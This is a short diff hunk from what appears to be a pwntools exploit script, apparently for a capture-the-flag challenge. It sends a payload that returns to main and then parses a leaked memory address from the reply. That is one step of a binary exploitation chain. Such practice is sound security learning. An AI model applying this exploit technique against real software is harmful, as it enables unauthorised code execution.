@@ -23,9 +23,7 @@ p += p64(main)
 
 r.readline()
 r.recvuntil('name: ') # remote host
-r.sendline(p)
-# r.sendline('\n') # local process
-
+r.sendline(p)         # local process
 
 w = r.recv().split()
 leak = int.from_bytes(w[0], byteorder='little') # remote host
